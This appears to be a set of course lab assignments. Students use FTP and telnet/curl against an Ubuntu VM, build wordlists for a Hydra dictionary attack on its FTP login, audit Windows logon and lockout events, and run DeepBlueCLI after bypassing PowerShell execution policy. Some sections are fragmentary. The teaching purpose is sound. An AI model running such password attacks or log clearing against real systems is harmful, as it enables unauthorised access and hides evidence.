  1. Open a new terminal and type following command to connect to the FTP server on your Ubuntu VM. For the name, type seed and for the password type dees
    • ftp -p 192.168.150.200 21
  2. Once logged into the FTP server, change to the /srv/ftp folder by typing the following command:
    • cd /srv/ftp
  3. Type the following command to list the content of the FTP server. You should at least see the index.pdf file
    • ls
  4. Type the following command to download the index.pdf file to your Kali Linux VM:
    • get index.pdf
  5. Take a screenshot showing that the index.pdf file was transferred (downloaded) successfully. 
  6. Open a new terminal and type the following command to create a text file with the content Test FTP Server and to save it as YourLastname-ftpu.txt, making sure to replace YourLastname with your last name:
    • echo Test FTP Server > YourLastname-ftpu.txt
  7. Type the following command to upload the YourLastname-ftpu.txt file to the FTP server on Ubuntu, making sure to replace YourLastname with your actual last name:
    • put YourLastname-ftpu.txt
  8. Take a screenshot showing that the YourLastname-ftpu.txt file was not uploaded (permission denied). 
  9. Type the following command to terminate the FTP connection
    • bye
  10. In a new terminal, change to the Desktop by typing the following command:
    • cd ~/Desktop
  11. Use mousepad or any other text editor (e.g., leafpad, gedit, nano, vim, etc.) to create a username wordlist text file (usernames.txt) with 6 usernames including the actual username for the FTP server on your Ubuntu VM (the actual user is: seed). In my case, I used mousepad per the command below and entered the following names into the file: root, admin, user, seed, jeff, george. Make sure to use your actual names.
    • sudo mousepad usernames.txt 
  12. Use mousepad or any other text editor (e.g., leafpad, gedit, nano, vim, etc.) to create a password wordlist text file (passwords.txt) with 6 passwords including the actual password for the FTP server on your Ubuntu VM (the actual password is: dees). In my case, I used mousepad per the command below and entered the following into the file: password, pass, user, dees, jeff, george. Make sure to use your actual names.
    • sudo mousepad passwords.txt 
  13. Use Hydra along with the usernames.txt and passwords.txt files to perform a dictionary attack against the FTP server on your Ubuntu VM. Watch the recording for detailed steps on how to use hydra.
  14. Take a screenshot from within Hydra showing that you performed a successful password attack. 

Submission Guidelines:

    • Please do NOT simply insert a bunch of screenshots in a Word document and expect me to know which one is which. Be specific and provide a description/short caption for each screenshot.
    • Upload [attach] your file to Canvas under this ‘Assignment’ link before the deadline.

Learning Objectives

  • Generate and capture network traffic. Specifically, generate network data in the context of interacting with an Apache Web Server.

Resources Needed

  • Kali Linux Virtual Machine
  • Ubuntu Virtual Machine

Pre-requisite

  • The following two previous assignments must be completed prior to working on the current assignment.
    • Download and Import/Create the Virtual Machines
    • Create a NAT Network and Configure the VMs with Static IP Addresses
  • Make sure the two machines can communicate with one another.

Task at Hand:

  • For this assignment, you need to capture network traffic using Wireshark and to generate network traffic by interacting with the Apache Web server that is pre-installed/pre-configured on Ubuntu.

Instructions:

If you have not done so, please watch the fourth recording on this link Network Services & Traffic Generation and complete this assignment by repeating what I did and capturing and submitting the relevant screenshots. Specifically,

Perform the following steps on your Ubuntu VM:

  1. Open a new terminal and change to the Downloads directory by typing the following command:
    • cd Downloads
  2. Type the following command to copy the index.pdf file to the Apache Web server root directory
    • sudo cp -b ~/Downloads/index.pdf /var/www/html


Perform the following steps on your Kali Linux VM:

  1. Open your Web browser and go to the following website
    • www.uvu.edu
  2. In your web browser, type the following IP to access the homepage of the Apache Web server hosted on the Ubuntu VM
    • 192.168.150.200
  3. You likely have telnet installed on your Kali Linux, but if you get a package error in the next step, come back to here. (Skip for now)
    Open a new terminal and type the following two commands to update your Kali Linux and then to install a telnet client on Kali Linux
    • sudo apt-get update
    • sudo apt-get install telnet
  4. In the terminal, type the following command to use telnet, as a user-agent, to connect to the Apache Web server on Ubuntu
    • telnet 192.168.150.200 80
  5. In the same terminal, send the HTTP GET command to the Apache Web server by typing the following and pressing Enter TWICE: 
    • GET / HTTP/1.0
  6. From within the terminal in Kali Linux, take a screenshot showing that the index.html page was retrieved successfully using the telnet session.
  7. In the terminal, type the following command to use telnet, as a user-agent, to connect to the Apache Web server on Ubuntu
    • telnet 192.168.150.200 80
  8. In the same terminal, send the HTTP GET command to retrieve the index.pdf file from the Apache Web server by typing the following and pressing Enter TWICE: 
    • GET /index.pdf HTTP/1.0
  9. From within the terminal in Kali Linux, take a screenshot showing that the index.pdf file was retrieved successfully using the telnet session.
  10. Type the following command to use curl, as a user-agent, download the index.pdf file using curl, making sure to use the IP address of your Ubuntu VM:
    • sudo curl -O http://192.168.150.200/index.pdf
  11. From within the terminal in Kali Linux, take a screenshot showing that the index.pdf file was retrieved successfully using curl.

Submission Guidelines:

    • Please do NOT simply insert a bunch of screenshots in a Word document and expect me to know which one is which. Be specific and provide a description/short caption for each screenshot.
    • Upload [attach] your file to Canvas under this ‘Assignment’ link before the deadline.

Pre-requisites

Task at Hand

Instructions (also provided in a Word document: Instructions)

  1. Open a new terminal and change to the Desktop
  2. If you have not done so previously, create a new directory on the Desktop and label it info4135. Otherwise, change to that directory.

1.    Submit  

    If you have not done so, please watch the recording on this link Basic Windows-Based Systems Log Analysis and complete this assignment by doing what I did and capturing and submitting the relevant screenshots.

    Learning Objectives

    • Analyze host-based logs (Windows) to audit password change, login attempts, and account lockouts.

    Resources Needed

    • Windows 10 Machine

    Task at Hand

    • For this assignment, you need to generate a host of security related events on your Windows 10 VM and to use Event Viewer to analyze the security logs for evidence of these events. Specifically, analyze the security logs to achieve the following:
      1. Auditing Password Change
      2. Auditing Login Attempts (successful and failed)
      3. Auditing Account Lockouts

    Submission Guidelines

    • Upload a document with the screenshots to Canvas by the deadline.

    Instructions (also provided in a Word document: Instructions Document)

     

    Part 1: Auditing Password Change

    1. Start Event Viewer using any of the following methods:
      • Method 1: Open Control Panel, click System and Security, Administrative Tools, and then double-click Event Viewer
      • Method 2: Type event viewer in the search box (lower left corner), select Event Viewer from the start menu
      • Method 3: Start a command prompt (or a PowerShell Window) as an administrator and type the following command:  
        • eventvwr
    2. In the left pane of Event Viewer, click Windows Logs and expand it
    3. Examine the Security logs and familiarize yourself with some of the logged events
    4. Clear the Security logs as follows:
      • Right-click on the Security log
      • Select Clear Log....
      • When prompted “You can save the contents of this log before clearing it.”, click Clear
    5. Close Event Viewer
    6. Open the command prompt as an administrator and type the following command to list all available user accounts 
      • net user
    7. Type the following command to change the password for the IEUser account to secret 
      • net user IEUser secret
    8. Start Event Viewer (see step 1), expand Windows Logs and then click Security
    9. Take a screenshot of the event associated with changing the password for the IEUser account

     

    Part 2: Auditing Login Attempts

    1. Open the “Local Security Policy Editor" using one of the following methods:
      • Method 1: Open Control Panel, click System and Security, Administrative Tools, and then double-click “Local Security Policy”
      • Method 2: Start a command prompt (or a PowerShell Window) as an administrator and type the following command 
        • gpedit
    2. In the left pane of the Local Security Policy Editor, click Local Policies and expand it
    3. Enable the auditing of logon events as follows:
      • In the left pane, click Audit Policy. View the Policies in the right pane. Notice that currently nothing is being audited which presents a problem from a security standpoint because we have no record of any authorized/unauthorized log on attempts (successful/failed).
      • Double-click on the “Audit logon events” policy
      • Under Audit these attempts, check the box next Success and the box next to Failure
      • Click Apply and then click OK
    4. Start Event Viewer, clear the Security logs, and close Event Viewer
    5. Close any other Windows that are still open.
    6. Sign out/Log off your virtual machine
    7. Log onto the Windows 10 VM by entering an incorrect password 5 times (You may want to wait a minute or two between the log in attempts)
    8. Log onto the Windows 10 VM by entering the correct password
    9. Start Event Viewer, expand Windows Logs, and then click Security
    10. Identify the security events related to the failed logon attempts and the event related to the successful logon attempt.
    11. Take a screenshot of an event indicating a failed login attempt

     

    Part 3: Enabling Account Lock-out

    1. Open the Local Group Policy Editor
    2. In the left pane of the Local Group Policy Editor, click and expand Account Policies
    3. Enable the Account Lockout Policy as follows:
      • In the left pane, click Account Lockout Policy. View the Policies in the right pane. Notice that currently no account lockout policy is enabled which presents a problem from a security standpoint because we have no means of stopping brute-force attack.
      • Double-click on the “Account lockout threshold" policy
      • Change the 0 to 3 to enable account lockout out after 3 invalid logon attempts
      • Click Apply and then click OK.
      • The changes per steps above would result in changing the values for the "Account lockout duration" and the "Reset account lockout counter after" policies to 30 minutes.
        • Change the "Account lockout duration" to 1 minute
        • Change the "Reset account lockout counter after" to 1 minute
      • Click OK
    4. Start Event Viewer, clear the Security logs, and then close Event Viewer
    5. Close any other Windows that are still open
    6. Sign out/Log off the Windows 10 VM
    7. Log onto the Windows 10 VM by entering an incorrect password 4 times
    8. Take a screenshot of the login screen indicating that you are locked out
    9. Wait 1 minute and log onto the Windows 10 VM by entering the correct password
    10. Start Event Viewer, expand Windows Logs, and then click Security
    11. In Event Viewer, identify the event related to the account lockout
    12. Take a screenshot of the event indicating an account was locked out


    Part 4: DeepBlueCLI (Setup and Run a PowerShell Script)

    1. Navigate to https://github.com/sans-blue-team/DeepBlueCLI
    2. Click the green "Code" button and "Download ZIP" or use this link: https://github.com/sans-blue-team/DeepBlueCLI/archive/refs/heads/master.zip
    3. Extract the package to the Desktop
    4. Open PowerShell ISE as Administrator
    5. Change to the directory where you extracted the package (your command will be similar to below): 
      cd C:\Users\IEUser\Desktop\DeepBlueCLI-master

    6. Run the following PowerShell script   

      .\DeepBlue.ps1 C:\Windows\System32\winevt\Logs\Security.evtx
    7. If you receive a "not digitally signed" error, run the following command, and select "Yes to All" (and re-run Step 6). 
      Set-ExecutionPolicy Bypass
    8. Note the findings.
    9. Take a screenshot showing the results of the script.

Submit
